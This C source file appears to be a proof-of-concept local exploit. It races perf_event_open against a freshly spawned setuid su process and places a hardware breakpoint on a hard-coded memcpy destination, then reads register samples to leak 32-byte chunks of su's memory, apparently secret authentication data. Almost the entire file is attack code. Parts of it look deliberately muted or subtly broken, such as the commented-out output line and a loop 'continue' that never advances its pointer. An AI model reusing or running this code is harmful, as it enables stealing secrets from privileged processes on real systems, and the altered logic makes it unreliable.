//sudo apt-get update
//sudo apt-get install libutempter-dev
//gcc -std=gnu99 -Wall -o test test.c -lutil -lutempter
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <err.h>
#include <inttypes.h>
#include <assert.h>
#include <errno.h>
#include <string.h>
#include <pty.h>
#include <termios.h>

#include <utempter.h>

#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/wait.h>

#include <linux/perf_event.h>
#include <linux/hw_breakpoint.h>
#include <asm/perf_regs.h>

#define SU_MAIN_ADDR 0x4024e0
//#define MEMCPY_DST_ADDR 0x620268
#define MEMCPY_DST_ADDR 0x620458
#define MEMCPY_SRC_ADDR_FIRST32 0x7ffff7ff53b8


#define MEMCPY_DST_ADDR_FIRST32 (0x62026d & ~0x3)
// with ASLR, first32 dst: 0xd8826d, 0x208d26d, ...
//#define MEMCPY_DST_ADDR_FIRST32 (0xd8826d & ~0x3)

struct my_event {
    struct perf_event_header header;
    uint64_t   abi;
    uint64_t   regs[4];
};

long perf_event_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
	return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

int main(void) {
	#define PARALLEL_COUNT 1
	int masterfd[PARALLEL_COUNT];
	pid_t child[PARALLEL_COUNT];
	int perf_fd[PARALLEL_COUNT];
	for (int i=0; i < PARALLEL_COUNT; i++) {
		int slavefd;
		if (openpty(&masterfd[i], &slavefd, NULL, NULL, NULL))
			return -1;
			// err(1, "openpty");
		if (utempter_add_record(masterfd[i], NULL) == 0)
			return -1;
			// errx(1, "utempter, adding record");
		child[i] = fork();
		if (child[i] == -1)
			return -1;
			// err(1, "fork");
		if (child[i] == 0) {
			// hack: let su inherit the master fd so that it's only closed when su dies
			dup2(slavefd, 0);
			dup2(slavefd, 1);
			dup2(slavefd, 2);
			close(slavefd);
			alarm(5); /* if this process gets stuck, don't keep all the su instances alive */
			execl("/bin/su", "su", "user", NULL);
			return -1;
			// err(1, "execl");
		}
		struct perf_event_attr attr = {
			.type = PERF_TYPE_BREAKPOINT,
			.size = sizeof(struct perf_event_attr),
			.bp_type = HW_BREAKPOINT_W,
			.bp_addr = MEMCPY_DST_ADDR_FIRST32,
			.bp_len = /*sizeof(long)*/4,
			.sample_period = 1,
			.sample_type = PERF_SAMPLE_REGS_USER,
			.exclude_kernel = 1,
			.exclude_hv = 1,
			.exclude_idle = 1,
			.precise_ip = 2,
			/* the main loop for 32-byte chunks in midsize memcpy uses rax,r8,r9,r10*/
			.sample_regs_user = (1ULL << PERF_REG_X86_AX) | (1ULL << PERF_REG_X86_R8) | (1ULL << PERF_REG_X86_R9) | (1ULL << PERF_REG_X86_R10)
		};
		usleep(/*500*/150);
		perf_fd[i] = perf_event_open(&attr, child[i], -1, -1, 0);
		if (perf_fd[i] == -1 && errno == EACCES) {
			//puts("too late");
			if (kill(child[i], 9))
				return -1;
				// err(1, "unable to kill setuid child");
			int status;
			if (waitpid(child[i], &status, 0) != child[i])
				return -1;
				// err(1, "waitpid");
			child[i] = 0;
			if (utempter_remove_record(masterfd[i]) == 0)
				return -1;
				// errx(1, "utempter, removing record early");
			close(masterfd[i]);
			masterfd[i] = -1;
		} else if (perf_fd[i] == -1) {
			return -1;
			// err(1, "perf_event_open");
		}
		close(slavefd);
	}
	usleep(100000); // increase if you want to attach with gdb
	for (int i=0; i < PARALLEL_COUNT; i++) {
		if (child[i] == 0)
			continue;
		if (write(masterfd[i], "foo\r\n", 5) != 5)
			return -1;
			// err(1, "write to pty master");
	}

	for (int i=0; i < PARALLEL_COUNT; i++) {
		if (child[i] == 0)
			continue;
		#define MMAP_SIZE ((1+64)*4096)
		struct perf_event_mmap_page *meta_page = mmap(NULL, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, perf_fd[i], 0);
		if (meta_page == MAP_FAILED)
			return -1;
			// err(1, "mmap");

		int status;
		if (waitpid(child[i], &status, 0) != child[i])
			return -1;
			// err(1, "waitpid");

		if (utempter_remove_record(masterfd[i]) == 0)
			return -1;
			// errx(1, "utempter, removing record late");
		close(masterfd[i]);

		uint64_t data_head = meta_page->data_head;
		asm volatile("lfence":::"memory");
		if (data_head != 0) { /* ==0 means too early (unlikely) or bad ASLR guess (very likely) */
			// printf("data_head is at %lx\n", data_head);
			struct perf_event_header *head = (void*)((char*)meta_page + 4096);
			while ((char*)head + head->size < (char*)meta_page + 4096 + data_head) {
				if (head->type == PERF_RECORD_SAMPLE) {
					char data[32 + 1];
					struct my_event *ev = (void*)head;
					memcpy(data, ev->regs, 32);
					data[32] = '\0';
					if (strlen(data) == 32) { /* quick check to ignore garbage */
						continue;
						// printf("got data: %s\n", data);
					}
				}
				head = (void*)((char*)head + head->size);
			}
		}
		munmap(meta_page, MMAP_SIZE);
		close(perf_fd[i]);
	}
	return 0;
}